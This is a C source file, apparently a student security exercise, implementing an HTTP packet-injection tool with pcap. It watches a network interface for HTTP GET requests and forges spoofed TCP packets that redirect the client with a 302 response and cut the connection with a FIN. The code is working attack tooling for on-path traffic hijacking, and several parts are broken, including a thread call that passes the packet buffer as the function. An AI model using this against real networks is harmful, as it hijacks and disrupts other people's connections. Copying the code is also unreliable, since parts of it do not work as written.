#pragma comment(lib, "packet.lib")
#pragma comment(lib, "wpcap.lib")


#define HAVE_REMOTE

#include <stdio.h>
#include <stdlib.h>
//#include <process.h>
#include <signal.h>
#include <pcap.h>
//#include <net/ethernet.h>
#include <netinet/in.h>

//#include <remote-ext.h>
#include "net_header.h"

#define MSG				"blocked"
#define REDIRECT_PCKT	"HTTP/1.1 302 Found\r\n"\
						"Location: https://en.wikipedia.org/wiki/HTTP_302\r\n"


struct pseudo_hdr
{
	struct in_addr src_ip;
	struct in_addr dst_ip;
	unsigned char zero;
	unsigned char protocol;
	unsigned short length;
};

pcap_t *fp;


int setup_pcap(void)
{
/*	struct bpf_program fp;

	bpf_u_int32 mask;
	bpf_u_int32 net;

	char filter_exp[] = "";

	dev = pcap_lookupdev(errbuf);
	pcap_lookupnet(dev, &net, &mask, errbuf);

	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
*/
	pcap_if_t *alldevs, *d;
	u_int inum, i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];

	printf("\nprinting the device list ...:\n");

	if (pcap_findalldevs(&alldevs, errbuf) == -1) {
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		return -1;
	}


	for (d = alldevs; d; d = d->next) {
		printf("%d. %s\n    ", ++i, d->name);

		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0) {
		fprintf(stderr, "No interfaces found! Exiting.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i) {
		printf("\nInterface number out of range.\n");

		pcap_freealldevs(alldevs);
		return -1;
	}

	for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);

	if ((fp = pcap_open_live(d->name, 100, 0, 20, errbuf)) == NULL) {
		fprintf(stderr, "\nError opening adapter\n");
		return -1;
	}
}

unsigned short ip_checksum(unsigned short *buf, int len)
{
	unsigned int data_len, checksum = 0;

	data_len = len * sizeof(unsigned short);
	while (len--)
		checksum += *buf++;

	if (data_len % 2) checksum += *buf++ & 0x00FF;

	checksum = (checksum >> 16) + (checksum & 0xFFFF);
	checksum += (checksum >> 16);

	return (unsigned short)(~checksum);
}

unsigned short tcp_checksum(const void *buff, size_t len, struct pseudo_hdr *phdr)
{
	const unsigned short *buf = buff;
	unsigned short *ip_src = (void *)&phdr->src_ip, *ip_dst = (void *)&phdr->dst_ip;
	unsigned short *protocol = (void *)&phdr->protocol;
	unsigned int checksum;
	size_t length = len;

	checksum = 0;
	while (len > 1)
	{
		checksum += *buf++;
		if (checksum & 0x80000000)
			checksum = (checksum & 0xFFFF) + (checksum >> 16);
		len -= 2;
	}

	if (len & 1)
		checksum += *((unsigned char *)buf);

	checksum += *(ip_src++);
	checksum += *ip_src;
	checksum += *(ip_dst++);
	checksum += *ip_dst;
	checksum += htons(*protocol);
	checksum += htons(length);

	while (checksum >> 16)
		checksum = (checksum & 0xFFFF) + (checksum >> 16);

	return (unsigned short)(~checksum);
}

unsigned /*WINAPI*/ block_connect(void *arg)
{
	struct ether_header *eth_hdr;
	struct ip_header    *ip_hdr;
	struct tcp_header   *tcp_hdr;
	struct pseudo_hdr   phdr = { 0, };

	struct in_addr ip_temp;

	u_char *ijt_pckt;
	u_int8_t mac_temp[ETH_ALEN];
	u_int16_t port_temp;

	int ijt_pckt_size;
	unsigned int temp;

	ijt_pckt = (u_char *)arg;

	eth_hdr = (struct ether_header *)ijt_pckt;
	ip_hdr =  (struct ip_header *)(ijt_pckt + sizeof(struct ether_header));
	tcp_hdr = (struct tcp_header *)((u_char *)ip_hdr + ip_hdr->ip_header_len * 4);

	ip_hdr->ip_total_length = htons(ip_hdr->ip_header_len * 4 + tcp_hdr->data_offset * 4 + strlen(REDIRECT_PCKT));
	ip_hdr->ip_ttl = 45;
	ip_hdr->ip_checksum = 0;
	ip_hdr->ip_checksum = ip_checksum((unsigned short *)ip_hdr, (ip_hdr->ip_header_len * 4) / sizeof(unsigned short));

	memcpy(&phdr.src_ip, &ip_hdr->ip_srcaddr, sizeof(struct in_addr));
	memcpy(&phdr.dst_ip, &ip_hdr->ip_destaddr, sizeof(struct in_addr));
	memcpy(&phdr.protocol, &ip_hdr->ip_protocol, sizeof(u_int8_t));
	phdr.length = htons(tcp_hdr->data_offset * 4 + strlen(REDIRECT_PCKT));

	tcp_hdr->fin      = 1;
	tcp_hdr->checksum = 0;
	tcp_hdr->checksum = tcp_checksum(tcp_hdr, tcp_hdr->data_offset * 4 + strlen(REDIRECT_PCKT), &phdr);

	ijt_pckt_size = sizeof(struct ether_header) + ip_hdr->ip_header_len * 4 + tcp_hdr->data_offset * 4 + strlen(REDIRECT_PCKT);
	pcap_sendpacket(fp, ijt_pckt, ijt_pckt_size);
	
	memcpy(mac_temp, eth_hdr->ether_shost, ETH_ALEN);
	memcpy(eth_hdr->ether_shost, eth_hdr->ether_dhost, ETH_ALEN);
	memcpy(eth_hdr->ether_dhost, mac_temp, ETH_ALEN);

	memcpy(&ip_temp, &ip_hdr->ip_srcaddr, sizeof(struct in_addr));
	memcpy(&ip_hdr->ip_srcaddr, &ip_hdr->ip_destaddr, sizeof(struct in_addr));
	memcpy(&ip_hdr->ip_destaddr, &ip_temp, sizeof(struct in_addr));

	memcpy(&port_temp, &tcp_hdr->source_port, sizeof(u_int16_t));
	memcpy(&tcp_hdr->source_port, &tcp_hdr->dest_port, sizeof(u_int16_t));
	memcpy(&tcp_hdr->dest_port, &port_temp, sizeof(u_int16_t));

	temp = tcp_hdr->acknowledge;
	tcp_hdr->acknowledge = tcp_hdr->sequence;
	tcp_hdr->sequence    = temp;

	tcp_hdr->checksum = 0;
	tcp_hdr->checksum = tcp_checksum(tcp_hdr, tcp_hdr->data_offset * 4 + strlen(REDIRECT_PCKT), &phdr);

	pcap_sendpacket(fp, ijt_pckt, ijt_pckt_size);
	
	free(ijt_pckt);

	return 0;
}

void detect_http_pckt(void)
{
	pthread_t tid[2];
	int hThread;
	unsigned threadID;

	struct ether_header *eth_hdr;
	struct ip_header    *ip_hdr;
	struct tcp_header   *tcp_hdr;

	struct pcap_pkthdr *header;

	int res, ijt_pckt_size;
	const u_char *packet, *payload, *ijt_pckt, *keyword;

	while ((res = pcap_next_ex(fp, &header, &packet)) >= 0) {
		if (!res) continue;
		
		eth_hdr = (struct ether_header *)packet;

		if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {
			ip_hdr = (struct ip_header *)(packet + sizeof(struct ether_header));

			if (ip_hdr->ip_protocol == IPPROTO_TCP) {
				tcp_hdr = (struct tcp_header *)(packet + sizeof(struct ether_header) + ip_hdr->ip_header_len * 4);
				payload = (u_char *)tcp_hdr + tcp_hdr->data_offset * 4;

				ijt_pckt_size = sizeof(struct ether_header) + ip_hdr->ip_header_len * 4 + tcp_hdr->data_offset * 4 + strlen(REDIRECT_PCKT);
				ijt_pckt = (u_char *)malloc(ijt_pckt_size);

				memcpy(ijt_pckt, packet, ijt_pckt_size - strlen(REDIRECT_PCKT));
				memcpy(ijt_pckt + ijt_pckt_size - strlen(REDIRECT_PCKT), REDIRECT_PCKT, strlen(REDIRECT_PCKT));

				keyword = strtok((char *)payload, " :\r\n");
				while (keyword) {
					if (!strcmp(keyword, "GET")) {
						tcp_hdr = (struct tcp_header *)(ijt_pckt + sizeof(struct ether_header) + ip_hdr->ip_header_len * 4);
						tcp_hdr->sequence = htonl(ntohl(tcp_hdr->sequence) + ntohs(ip_hdr->ip_total_length) - ip_hdr->ip_header_len * 4 - tcp_hdr->data_offset * 4);
						//printf("data size : %d\n", ntohs(ip_hdr->ip_total_length) - ip_hdr->ip_header_len * 4 - tcp_hdr->data_offset * 4);
						hThread = pthread_create(&tid[0], NULL, ijt_pckt, NULL); // _beginehreadex(NULL, 0, block_connect, (void *)ijt_pckt, 0, &threadID);
						break;
					}
					keyword = strtok(NULL, " :\r\n");
				}
			}
		}
	}
}

int main(int argc, char *argv[])
{
	char *track = "취약점";
	char *name  = "신동민";
	printf("[bob5][%s]http_inject[%s]", track, name);

	setup_pcap();
	detect_http_pckt();
	return 0;
}
